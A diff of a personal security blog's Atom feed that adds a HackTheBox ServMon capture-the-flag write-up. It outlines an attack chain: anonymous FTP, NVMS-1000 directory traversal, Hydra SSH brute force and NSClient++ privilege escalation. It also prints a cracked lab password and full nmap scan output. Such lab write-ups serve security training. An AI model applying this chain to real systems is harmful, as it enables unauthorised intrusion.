@@ -1,4 +1,386 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-21T23:43:54+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Rajat.Rao</title><subtitle>Hi, My name is Rajat Rao. The blog focuses on security reseach and writeupss.</subtitle><author><name>Rajat Rao</name></author><entry><title type="html">Mobile Security</title><link href="http://localhost:4000/learning/2020/06/10/Mobile-Security/" rel="alternate" type="text/html" title="Mobile Security" /><published>2020-06-10T14:35:23+05:30</published><updated>2020-06-10T14:35:23+05:30</updated><id>http://localhost:4000/learning/2020/06/10/Mobile-Security</id><content type="html" xml:base="http://localhost:4000/learning/2020/06/10/Mobile-Security/">&lt;style&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-23T18:34:37+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Rajat.Rao</title><subtitle>Hi, My name is Rajat Rao. The blog focuses on security reseach and writeupss.</subtitle><author><name>Rajat Rao</name></author><entry><title type="html">HackTheBox ServMon Writeup</title><link href="http://localhost:4000/htb/2020/06/21/HackTheBox-ServMon/" rel="alternate" type="text/html" title="HackTheBox ServMon Writeup" /><published>2020-06-21T15:22:20+05:30</published><updated>2020-06-21T15:22:20+05:30</updated><id>http://localhost:4000/htb/2020/06/21/HackTheBox-ServMon</id><content type="html" xml:base="http://localhost:4000/htb/2020/06/21/HackTheBox-ServMon/">&lt;h2 id=&quot;brief&quot;&gt;Brief&lt;/h2&gt;
+&lt;p&gt;    On enumerating different services of &lt;code class=&quot;highlighter-rouge&quot;&gt;ServMon&lt;/code&gt; machine, we were able to find few confidentails files from &lt;code class=&quot;highlighter-rouge&quot;&gt;FTP&lt;/code&gt; service which discloses a hint saying that list of password is stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathan&lt;/code&gt; uers desktop. On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. &lt;code class=&quot;highlighter-rouge&quot;&gt;NVMS-1000&lt;/code&gt;. On assessing the software, it was vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;Directory Traversal&lt;/code&gt; vulnerability which helps us to conquer the &lt;code class=&quot;highlighter-rouge&quot;&gt;Passwords.txt&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathan's&lt;/code&gt; desktop by using exploit available on exploit-db. On this point we have got a list of passsword and two usersname ( &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathan&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Nadine&lt;/code&gt; ), we try to brute force the available &lt;code class=&quot;highlighter-rouge&quot;&gt;SSH&lt;/code&gt; service on target machine using &lt;code class=&quot;highlighter-rouge&quot;&gt;Hydra&lt;/code&gt;. On the conclusion of brute forcing, we were able to find credentails of &lt;code class=&quot;highlighter-rouge&quot;&gt;nadine&lt;/code&gt; and taking leverage of it, we ssh to the machine using &lt;code class=&quot;highlighter-rouge&quot;&gt;nadine&lt;/code&gt; cracked password and get &lt;code class=&quot;highlighter-rouge&quot;&gt;proof.txt&lt;/code&gt;. Once we got the local access, enumeration helped us to find &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient++&lt;/code&gt; running and on expxloitation of it using publicly available script, we were able to get maximum level of privelege and get &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;h2 id=&quot;flow&quot;&gt;Flow&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Anonymous FTP&lt;/code&gt; reveals &lt;code class=&quot;highlighter-rouge&quot;&gt;Confidential.txt&lt;/code&gt; file from &lt;code class=&quot;highlighter-rouge&quot;&gt;Nadine&lt;/code&gt; folder sharing a hint of &lt;code class=&quot;highlighter-rouge&quot;&gt;Passwords.txt&lt;/code&gt; being stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathan's&lt;/code&gt; desktop.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Exploiting &lt;code class=&quot;highlighter-rouge&quot;&gt;NVMS-1000's Directory Traversal&lt;/code&gt; vulneability available on port 80 to get &lt;code class=&quot;highlighter-rouge&quot;&gt;Passwords.txt&lt;/code&gt; file using script from &lt;code class=&quot;highlighter-rouge&quot;&gt;exploit-db&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Brute force &lt;code class=&quot;highlighter-rouge&quot;&gt;SSH&lt;/code&gt; service using two usernames &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathan&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Nadine&lt;/code&gt; against &lt;code class=&quot;highlighter-rouge&quot;&gt;Passwords.txt&lt;/code&gt; using &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Login as &lt;code class=&quot;highlighter-rouge&quot;&gt;nadine&lt;/code&gt; with credentials found via &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt; ( &lt;code class=&quot;highlighter-rouge&quot;&gt;nadine:L1k3B1gBut7s@W0rk&lt;/code&gt; )&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Get &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Local enumeramation discloses usage of &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient++&lt;/code&gt; and also &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; ( &lt;strong&gt;8443&lt;/strong&gt; )report discloses the same in target machine&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Search for &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient ++&lt;/code&gt; leads to publicly available writeup ( &lt;code class=&quot;highlighter-rouge&quot;&gt;exploit-db&lt;/code&gt; ) to escalate the privilege.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Follow steps provided in write-up&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Get &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt;Below is a detail writeup of the machine following the below steps:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/#informationgathering&quot;&gt;Information Gathering&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/#lowprivilegeshell&quot;&gt;Low-Privilege Shell&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/#privilegeescaltion&quot;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p id=&quot;informationgathering&quot;&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;h2 id=&quot;1-information-gathering&quot;&gt;1. Information Gathering&lt;/h2&gt;
+&lt;h3 id=&quot;11--nmap&quot;&gt;1.1 || Nmap&lt;/h3&gt;
+
+&lt;p&gt;-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Run nmap&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ nmap -sC -sV -p- -oA full 10.10.10.184&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;where,&lt;/p&gt;
+
+&lt;p&gt;    &lt;strong&gt;-sC&lt;/strong&gt; : Run Default Scripts&lt;/p&gt;
+
+&lt;p&gt;    &lt;strong&gt;-sV&lt;/strong&gt; : Enumerate different versions&lt;/p&gt;
+
+&lt;p&gt;    &lt;strong&gt;-sA&lt;/strong&gt; : Store the output in all format (.nmap, .xml and .gnmap) having name full&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;c1&quot;&gt;# Nmap 7.80 scan initiated Sat May  2 17:07:00 2020 as: nmap -sC -sV -oA tcp 10.10.10.184&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;Nmap scan report for 10.10.10.184&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;Host is up (0.22s latency).&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Not shown&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;991 closed ports&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;PORT     STATE SERVICE       VERSION&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;21/tcp   open  ftp           Microsoft ftpd&lt;/span&gt;
+  &lt;span class=&quot;s&quot;&gt;ftp-anon&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Anonymous FTP login allowed (FTP code 230)&lt;/span&gt;
+ &lt;span class=&quot;s&quot;&gt;_01-18-20  12:05PM       &amp;lt;DIR&amp;gt;          Users&lt;/span&gt;
+  &lt;span class=&quot;s&quot;&gt;ftp-syst&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
+ &lt;span class=&quot;na&quot;&gt;_  SYST&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Windows_NT&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)&lt;/span&gt;
+  &lt;span class=&quot;s&quot;&gt;ssh-hostkey&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
+    &lt;span class=&quot;s&quot;&gt;2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)&lt;/span&gt;
+ &lt;span class=&quot;s&quot;&gt;_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;80/tcp   open  http&lt;/span&gt;
+  &lt;span class=&quot;s&quot;&gt;fingerprint-strings&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
+    &lt;span class=&quot;s&quot;&gt;GetRequest, HTTPOptions, RTSPRequest&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
+      &lt;span class=&quot;s&quot;&gt;HTTP/1.1 200 OK&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;Content-type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;340&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+     &lt;span class=&quot;na&quot;&gt;AuthInfo&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
+      &lt;span class=&quot;s&quot;&gt;&amp;lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;&amp;lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;window.location.href = &quot;Pages/login.htm&quot;;&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
+      &lt;span class=&quot;s&quot;&gt;HTTP/1.1 408 Request Timeout&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;Content-type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+ &lt;span class=&quot;na&quot;&gt;_    AuthInfo&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+ &lt;span class=&quot;na&quot;&gt;_http-title&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Site doesn't have a title (text/html).&lt;/span&gt;
+ &lt;span class=&quot;na&quot;&gt;_http-trane-info&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Problem with XML parsing of /evox/about&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;135/tcp  open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;445/tcp  open  microsoft-ds?&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;5666/tcp open  tcpwrapped&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;6699/tcp open  napster?&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;8443/tcp open  ssl/https-alt&lt;/span&gt;
+  &lt;span class=&quot;s&quot;&gt;fingerprint-strings&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
+    &lt;span class=&quot;s&quot;&gt;FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
+      &lt;span class=&quot;s&quot;&gt;HTTP/1.1 &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;404&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;18&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;Document not found&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;GetRequest&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
+     &lt;span class=&quot;s&quot;&gt;HTTP/1.1 &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;302&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/index.html&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;urday&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;workers&lt;/span&gt;
+ &lt;span class=&quot;s&quot;&gt;_    jobs&lt;/span&gt;
+  &lt;span class=&quot;s&quot;&gt;http-title&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;NSClient++&lt;/span&gt;
+ &lt;span class=&quot;s&quot;&gt;_Requested resource was /index.html&lt;/span&gt;
+  &lt;span class=&quot;s&quot;&gt;ssl-cert&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Subject&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;commonName=localhost&lt;/span&gt;
+  &lt;span class=&quot;s&quot;&gt;Not valid before&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;2020-01-14T13:24:20&lt;/span&gt;
+ &lt;span class=&quot;na&quot;&gt;_Not valid after&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;2021-01-13T13:24:20&lt;/span&gt;
+ &lt;span class=&quot;na&quot;&gt;_ssl-date&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;TLS randomness does not represent time&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;			&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF-Port80-TCP:V=7.80%I=7%D=5/2%Time=5EAD5B9B%P=x86_64-pc-linux-gnu%r(NULL,&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:6B,&quot;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/htm&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:l\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:r\n&quot;)%r(GetRequest,1B4,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x2&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:0\r\n\r\n\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&quot;-//W3C//DTD\x20XH&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:TML\x201\.0\x20Transitional//EN\&quot;\x20\&quot;http://www\.w3\.org/TR/xhtml1/DT&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:D/xhtml1-transitional\.dtd\&quot;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&quot;http://www\.w3\.o&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:rg/1999/xhtml\&quot;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\x&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:20\x20\x20&amp;lt;script\x20type=\&quot;text/javascript\&quot;&amp;gt;\r\n\x20\x20\x20\x20\x20\&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:x20\x20\x20window\.location\.href\x20=\x20\&quot;Pages/login\.htm\&quot;;\r\n\x20&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:\x20\x20\x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&quot;)%&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:r(HTTPOptions,1B4,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:\r\n\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&quot;-//W3C//DTD\x20XHTML\x&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:201\.0\x20Transitional//EN\&quot;\x20\&quot;http://www\.w3\.org/TR/xhtml1/DTD/xht&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:ml1-transitional\.dtd\&quot;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&quot;http://www\.w3\.org/19&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:99/xhtml\&quot;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\x20\x2&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:0\x20&amp;lt;script\x20type=\&quot;text/javascript\&quot;&amp;gt;\r\n\x20\x20\x20\x20\x20\x20\x&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:20\x20window\.location\.href\x20=\x20\&quot;Pages/login\.htm\&quot;;\r\n\x20\x20\&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:x20\x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&quot;)%r(RTS&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:PRequest,1B4,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nC&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:ontent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&quot;-//W3C//DTD\x20XHTML\x201\.&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:0\x20Transitional//EN\&quot;\x20\&quot;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-t&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:ransitional\.dtd\&quot;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&quot;http://www\.w3\.org/1999/xh&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:tml\&quot;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\x20\x20\x20&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:&amp;lt;script\x20type=\&quot;text/javascript\&quot;&amp;gt;\r\n\x20\x20\x20\x20\x20\x20\x20\x2&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:0window\.location\.href\x20=\x20\&quot;Pages/login\.htm\&quot;;\r\n\x20\x20\x20\x&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&quot;);&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=5/2%Time=5EAD5BA3%P=x86_64-pc-linux-gnu&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:%r(GetRequest,74,&quot;HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation:&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\x1d\x02\0\0\0\0\0\0\x1d\x0&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:2\0\0urday\0\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x0&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:3\x18\xbb\x01\x12&quot;)%r(HTTPOptions,36,&quot;HTTP/1\.1\x20404\r\nContent-Lengt&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:h:\x2018\r\n\r\nDocument\x20not\x20found&quot;)%r(FourOhFourRequest,36,&quot;HTTP&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found&quot;)&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:%r(RTSPRequest,36,&quot;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDoc&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:ument\x20not\x20found&quot;)%r(SIPOptions,36,&quot;HTTP/1\.1\x20404\r\nContent-Le&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;SF:ngth:\x2018\r\n\r\nDocument\x20not\x20found&quot;);&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Service Info&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;OS&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Windows; CPE&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cpe:/o:microsoft:windows&lt;/span&gt;
+
+&lt;span class=&quot;na&quot;&gt;Host script results&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+ &lt;span class=&quot;na&quot;&gt;_clock-skew&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;3m07s&lt;/span&gt;
+  &lt;span class=&quot;s&quot;&gt;smb2-security-mode&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
+    &lt;span class=&quot;s&quot;&gt;2.02&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
+ &lt;span class=&quot;s&quot;&gt;_    Message signing enabled but not required&lt;/span&gt;
+  &lt;span class=&quot;s&quot;&gt;smb2-time&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
+    &lt;span class=&quot;na&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;2020-05-02T11:43:32&lt;/span&gt;
+ &lt;span class=&quot;na&quot;&gt;_  start_date&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;N/A&lt;/span&gt;
+
+&lt;span class=&quot;s&quot;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Nmap done at Sat May  2 17:11:06 2020 -- 1 IP address (1 host up) scanned in 246.55 seconds&lt;/span&gt;
+
